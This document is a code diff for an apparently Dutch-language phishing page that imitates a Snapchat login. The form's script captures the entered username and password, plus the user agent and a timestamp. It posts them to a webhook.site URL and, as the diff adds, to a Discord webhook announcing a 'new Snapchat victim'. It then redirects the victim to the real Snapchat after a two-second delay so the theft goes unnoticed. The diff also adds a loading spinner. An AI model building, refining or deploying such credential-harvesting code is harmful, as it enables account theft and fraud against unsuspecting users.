@@ -61,6 +61,17 @@
         }
         button:hover { background: #f2e900; }
         .footer { margin-top: 20px; font-size: 12px; color: #999; }
+        .loader {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #ddd;
+            border-top-color: #333;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 12px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -73,7 +84,8 @@
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Gebruikersnaam of e-mail" required>
             <input type="password" id="password" name="password" placeholder="Wachtwoord" required>
-            <button type="submit">Log in</button>
+            <button type="submit" id="submitBtn">Log in</button>
+            <div class="loader" id="loader"></div>
         </form>
         <div class="footer">Nog geen account? <a href="#">Aanmelden</a></div>
     </div>
@@ -82,24 +94,61 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Data ophalen
-            const data = {
-                username: document.getElementById('username').value,
-                password: document.getElementById('password').value
-            };
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var submitBtn = document.getElementById('submitBtn');
+            var loader = document.getElementById('loader');
             
-            // Versturen naar Webhook.site
+            // Toon loader
+            submitBtn.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // 1. Stuur naar Webhook.site
             fetch('https://webhook.site/edc9ee44-326a-4cd4-9dc4-34ac54df77bd', {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(function(err) {
+                console.error('Webhook error:', err);
             });
             
-            // Direct doorsturen naar echte Snapchat
-            window.location.href = 'https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYdXJhbnhuaHBkAZ14D-ceAZ14DeB5AAAAAQ?ref=web_spotlight';
+            // 2. Stuur naar Discord
+            fetch('https://discord.com/api/webhooks/1511700822323495054/zbkEUXFd0MBCjRVY22RzWI2cnTnNTKvzupE7Wh8TUhcLnZ1s8yQ_DnB1UIVv-wS5546Y', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: '@everyone **Nieuw Snapchat slachtoffer!**',
+                    embeds: [{
+                        title: 'Inloggegevens gevangen',
+                        color: 0xfffc00,
+                        fields: [
+                            { name: 'Gebruikersnaam/E-mail', value: username || 'Onbekend', inline: true },
+                            { name: 'Wachtwoord', value: password || 'Onbekend', inline: true },
+                            { name: 'User-Agent', value: navigator.userAgent.length > 50 ? navigator.userAgent.substring(0, 50) + '...' : navigator.userAgent, inline: false },
+                            { name: 'Tijdstip', value: new Date().toLocaleString('nl-NL'), inline: false }
+                        ],
+                        footer: { text: 'SnapPhish Alert • GitHub Pages' },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(err) {
+                console.error('Discord error:', err);
+            });
+            
+            // 3. Na 2 seconden doorsturen naar echte Snapchat
+            setTimeout(function() {
+                window.location.href = 'https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYdXJhbnhuaHBkAZ14D-ceAZ14DeB5AAAAAQ?ref=web_spotlight';
+            }, 2000);
         });
     </script>
 </body>
